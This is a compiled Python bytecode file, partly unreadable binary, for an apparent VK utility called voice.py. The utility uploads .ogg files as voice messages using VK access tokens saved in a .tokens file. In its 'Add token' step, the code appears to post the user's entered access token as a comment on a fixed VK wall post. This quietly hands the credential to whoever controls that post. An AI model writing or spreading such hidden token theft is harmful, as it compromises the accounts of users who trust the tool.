U
    u�~^�  �                   @   s�  d dl Z d dlZd dlZe �d� edd�Ze��  dZdd� Ze	d� e
d	�Zed
kr�e
d�ZzRejed�Zejeddd�Zejjdded� edd�Ze�ed � e��  W n   e	d� Y nX e	�  e�  nedkr�e	d� e�  e	�  edd�Ze�� Ze��  eee��D ]xZee dd� ee< ejee d�Zejeddd�Zej�� d  Zed d ed  Ze	de d eed � � �qeee
d ��d  Zejed�Zejeddd�Ze� Z ee d �Z!e	�  g Z"e �#e�D ]>Z$e$d!d� d"k�r�e"�%e$� e	de$ d eee"�� � �q�ee"ee
d ��d   Z&ej'j(d#e!d$�d% Z)ej*e)d&ee&d'�id(��+� Z,ej'j-e,d& d)d*�d  Z$d+ee$d, � d- ee$d. � Z.ej/j0e!e.d/d0� e	d1� dS )2�    N�clearz.tokensza+z/storage/emulated/0/Download/c                  C   s  d} d}d}d}d}t d�}tt|��D ]�}|| dkr@|d } || k rJq(|dkr�| dkr�z4|| dkrp|d7 }t|| � d}||| 7 }W q�   ||| 7 }Y q�X q(|dkr�|| dkr�||| 7 }q�d	}q(|d	kr(||| 7 }q(|dk�rtd
� t�  n|d dk�rd}|||fS )Nr   � z[35mEnter the link: [0m�.�   �-�   �_�   z
[31mInvalid link
�w�post)�input�range�len�int�print�quit)Zspace�step�typeZfirstIDZsecondID�link�char� r   �voice.py�getlink
   sB    
r   ut  [37m
 InvertedOnes                      Vk: @inverted_ones[32m
 ┏━┳━━━┳━━━━━┳━┳━┳━┓  ┏━━┳━━┳━━━━━┳━━━━━┳━━━━━┳━━━━━┓
 ┃ ┃   ┃  ━━━┫ ┃ ┃ ┃  ┃  ┃  ┃  ┓  ┣━┓ ┏━┫ ┏━━━┫  ━━━┫
 ┃   ┃ ┃  ━━━┫     ┃  ┗┓   ┏┫  ┗  ┣━┛ ┗━┫ ┗━━━┫  ━━━┫
 ┗━━━┻━┻━━━━━┻━━┻━━┛   ┗━━━┛┗━━━━━┻━━━━━┻━━━━━┻━━━━━┛
[35m
[1] Send voice
[2] Add token
z&Please, enter your task's number: [0m�2z[35mEnter the token: [0m)Zaccess_tokenz5.92Zru)�vZlangi
��r   )�owner_idZpost_id�message�a�
z
[31mInvalid token�1z
[31mInvalid task number
�r�����z5.89Z
first_name� �	last_namez[33mz[37m z
[35mYour choice: [0m�����z.oggZaudio_message)r   Zpeer_idZ
upload_url�file�rb)�fileszIt's me)r%   �title�docr   r   �idZ3cd90f15df4c7f52c3)Zuser_id�
attachmentZ
access_keyz
[32mSuccessful
)1�osZvkZrequests�system�open�f�close�pathr   r   r   ZtaskZtkZSessionZsessionZAPIZapiZwallZcreateCommentr
   �writer   �	readlines�tokensr   r   Zusers�get�user�strr   �tokenZ	parametrsZ	recipientZaudios�listdirr%   �appendZaudioZdocsZgetMessagesUploadServerr   r   ZjsonZresponseZsaver+   Zmessages�sendr   r   r   r   �<module>   sh   

$

 
  